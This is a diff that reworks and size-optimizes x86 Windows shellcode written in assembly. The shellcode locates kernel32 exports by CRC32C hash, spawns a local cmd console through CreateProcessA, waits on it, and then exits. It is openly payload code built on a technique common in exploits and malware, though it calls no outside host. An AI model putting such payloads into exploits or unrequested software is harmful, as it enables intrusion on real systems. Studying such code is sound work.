@@ -1,5 +1,8 @@
     .section .shcode, "ax"
-/* MinGW entrypoint is either _mainCRTStartup or _WinMainCRTStartup */
+/* MinGW entrypoint is either _mainCRTStartup or _WinMainCRTStartup
+ * Define symbols with storage class 2 (IMAGE_SYM_CLASS_EXTERNAL), and object
+ * type 32 (function), for COFF Symbol Table.
+ */
     .globl _mainCRTStartup
     .def _mainCRTStartup; .scl 2; .type 32; .endef
     .set _mainCRTStartup, _start
@@ -10,7 +13,7 @@
     .def _start; .scl 2; .type 32; .endef
 _start:
     /* fc                */  cld                            /* Clear direction flag */
-    /* eb 79             */  jmp    start                   /* Make relative calls negative */
+    /* eb 76             */  jmp    start                   /* Make relative calls negative */
 
 /* Call the function in kernel32 identified by hash in eax */
 call_by_hash:
@@ -36,24 +39,24 @@ _find_kernel_module:
                                                             /* ebx = IMAGE_NT_HEADERS->OptionalHeader */
                                                             /*   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] */
                                                             /*   .VirtualAddress */
-    /* 01 eb             */  add    %ebp, %ebx              /* ebx = IMAGE_EXPORT_DIRECTORY - 0x10 to avoid a 0x20 */
-    /* 83 eb 10          */  sub    $0x10, %ebx
+    /* 8d 5c 1d f0       */  lea    -0x10(%ebp, %ebx, 1), %ebx
+                                                            /* ebx = IMAGE_EXPORT_DIRECTORY - 0x10 to avoid a 0x20 */
     /* 8b 4b 28          */  mov    0x28(%ebx), %ecx        /* ecx = ebx->NumberOfNames */
     /* 8b 7b 30          */  mov    0x30(%ebx), %edi        /* edi = ebx->AddressOfNames */
     /* 01 ef             */  add    %ebp, %edi
 
 _find_function:
-    /* e3 23             */  jecxz  _not_found              /* int3 if function not found */
+    /* e3 fe             */  jecxz  .                       /* Loop forever if function is not found */
     /* 49                */  dec    %ecx                    /* next function */
     /* 8b 34 8f          */  mov    (%edi, %ecx, 4), %esi
-    /* 01 ee             */  add    %ebp, %esi              /* Compute CRC32C: */
-    /* 31 d2             */  xor    %edx, %edx              /*   esi = name */
+    /* 01 ee             */  add    %ebp, %esi              /* Compute CRC32C of esi = name: */
     /* 31 c0             */  xor    %eax, %eax              /*   eax = current char/bit index */
-                                /*   edx = hash */
+    /* 99                */  cltd                           /*   edx = hash (sign-extend eax to edx:eax) */
+                                                            /*   ebx, ecx, edi, ebp: assigned */
 _compute_hash_loop:
-    /* ac                */  lods   %ds:(%esi), %al         /*   ebx, ecx, edi, ebp: assigned */
+    /* ac                */  lods   %ds:(%esi), %al
     /* 84 c0             */  test   %al, %al
-    /* 74 15             */  je     _hash_finished          /* End of name */
+    /* 74 14             */  je     _hash_finished          /* End of name */
     /* 30 c2             */  xor    %al, %dl
     /* b0 08             */  mov    $0x8, %al               /* Repeat for 8 bits */
 _compute_hash_bit:
@@ -65,16 +68,13 @@ _skip_xor:
     /* 75 f2             */  jne    _compute_hash_bit
     /* eb e7             */  jmp    _compute_hash_loop
 
-_not_found:
-    /* cc                */  int3
-
 _hash_finished:
     /* 3b 54 24 1c       */  cmp    0x1c(%esp), %edx        /* Compare hash with saved eax */
-    /* 75 d4             */  jne    _find_function          /* Loop back to _find_function */
+    /* 75 d6             */  jne    _find_function          /* Loop back to _find_function */
 
     /* 8b 73 34          */  mov    0x34(%ebx), %esi        /* esi = ebx->AddressOfNameOrdinals */
-    /* 01 ee             */  add    %ebp, %esi              /* By the way, eax = 0 */
-    /* 66 8b 04 4e       */  mov    (%esi, %ecx, 2), %ax    /* Convert ecx to ordinal ax */
+    /* 01 ee             */  add    %ebp, %esi
+    /* 0f b7 04 4e       */  movzwl (%esi, %ecx, 2), %eax   /* eax = 16-bit ordinal of function #ecx */
     /* 8b 73 2c          */  mov    0x2c(%ebx), %esi        /* esi = ebx->AddressOfFunctions */
     /* 01 ee             */  add    %ebp, %esi
     /* 8b 04 86          */  mov    (%esi, %eax, 4), %eax
@@ -85,31 +85,46 @@ _hash_finished:
     /* c3                */  ret
 
 start:
-    /* b8 01 63 6d 64    */  mov    $0x646d6301, %eax
-    /* c1 e8 08          */  shr    $0x8, %eax
-    /* 50                */  push   %eax                    /* Push "cmd" */
-    /* 31 c9             */  xor    %ecx, %ecx
-    /* b1 7c             */  mov    $0x7c, %cl              /* Allocate 124 bytes for: */
-    /* 29 cc             */  sub    %ecx, %esp              /*   PROCESS_INFORMATION (16) */
-    /* 89 e7             */  mov    %esp, %edi              /*   STARTUPINFO (68) */
-    /* 31 c0             */  xor    %eax, %eax              /*   10 arguments (40) */
-    /* f3 aa             */  rep stos %al, %es:(%edi)       /* ZeroMemory, edi = "cmd" */
-    /* 89 7c 24 04       */  mov    %edi, 0x4(%esp)         /* args(lpCommandLine) = edi */
-    /* 8d 74 24 28       */  lea    0x28(%esp), %esi        /* esi = &STARTUPINFO */
-    /* c6 06 44          */  movb   $0x44, (%esi)           /* esi->cbSize = 68 */
-    /* 89 76 f8          */  mov    %esi, -0x8(%esi)        /* args(lpStartupInfo) = esi */
-    /* 83 c6 44          */  add    $0x44, %esi             /* esi = &PROCESS_INFORMATION */
-    /* 89 74 24 24       */  mov    %esi, 0x24(%esp)        /* args(lpProcessInformation) = esi */
-    /* c6 44 24 10 01    */  movb   $0x1, 0x10(%esp)        /* args(bInheritHandles) = TRUE */
-    /* c6 44 24 14 10    */  movb   $0x10, 0x14(%esp)       /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
-    /* b8 24 05 1a 7a    */  mov    $0x7a1a0524, %eax       /* Call CreateProcessA */
-    /* e8 49 ff ff ff    */  call   call_by_hash
+    /* 68 01 63 6d 64    */  push   $0x646d6301             /* Push "\x1cmd" */
+    /* 6a 50             */  push   $0x50                   /* Allocate 80 bytes for: */
+    /* 59                */  pop    %ecx                    /*   PROCESS_INFORMATION (16) */
+    /* 29 cc             */  sub    %ecx, %esp              /*   STARTUPINFO (68) */
+    /* 89 e7             */  mov    %esp, %edi              /*   ... with size (-4) */
+    /* 31 c0             */  xor    %eax, %eax              /* ZeroMemory */
+    /* f3 aa             */  rep stos %al, %es:(%edi)       /*  ... and ecx = 0 */
+    /* c1 2f 08          */  shrl   $0x8, (%edi)            /*  ... and edi = "cmd" */
+    /* 6a 44             */  push   $0x44                   /* STARTUPINFO.cbSize = 68 */
+    /* 8d 74 24 44       */  lea    0x44(%esp), %esi        /* esi = &PROCESS_INFORMATION */
+    /* 89 e2             */  mov    %esp, %edx
+    /* 56                */  push   %esi                    /* args(lpProcessInformation) = esi */
+    /* 52                */  push   %edx                    /* args(lpStartupInfo) = &STARTUPINFO */
+    /* 51                */  push   %ecx                    /* args(lpCurrentDirectory) = NULL */
+    /* 51                */  push   %ecx                    /* args(lpEnvironment) = NULL */
+    /* 6a 10             */  push   $0x10                   /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
+    /* 6a 01             */  push   $0x1                    /* args(bInheritHandles) = TRUE */
+    /* 51                */  push   %ecx                    /* args(lpThreadAttributes) = NULL */
+    /* 51                */  push   %ecx                    /* args(lpProcessAttributes) = NULL */
+    /* 57                */  push   %edi                    /* args(lpCommandLine) = edi */
+    /* 51                */  push   %ecx                    /* args(lpApplicationName) = NULL */
+    /* b8 24 05 1a 7a    */  mov    $0x7a1a0524, %eax       /* Call CreateProcessA( */
+                                                            /*     0x00(%esp): lpApplicationName */
+                                                            /*     0x04(%esp): lpCommandLine  */
+                                                            /*     0x08(%esp): lpProcessAttributes */
+                                                            /*     0x0c(%esp): lpThreadAttributes */
+                                                            /*     0x10(%esp): bInheritHandles */
+                                                            /*     0x14(%esp): dwCreationFlags */
+                                                            /*     0x18(%esp): lpEnvironment */
+                                                            /*     0x1c(%esp): lpCurrentDirectory */
+                                                            /*     0x20(%esp): lpStartupInfo */
+                                                            /*     0x24(%esp): lpProcessInformation */
+    /* e8 59 ff ff ff    */  call   call_by_hash            /* ) */
+
     /* 6a ff             */  push   $0xffffffff             /* args(dwMilliseconds) = INFINITE */
     /* ad                */  lods   %ds:(%esi), %eax
     /* 50                */  push   %eax                    /* args(hHandle) = esi->hProcess */
     /* b8 76 51 94 d8    */  mov    $0xd8945176, %eax       /* Call WaitForSingleObject */
 _exit_loop:
-    /* e8 3b ff ff ff    */  call   call_by_hash
+    /* e8 4b ff ff ff    */  call   call_by_hash
     /* 31 c9             */  xor    %ecx, %ecx
     /* 51                */  push   %ecx                    /* args(uExitCode) = 0 */
     /* b8 d5 a5 c9 42    */  mov    $0x42c9a5d5, %eax       /* Call ExitProcess */
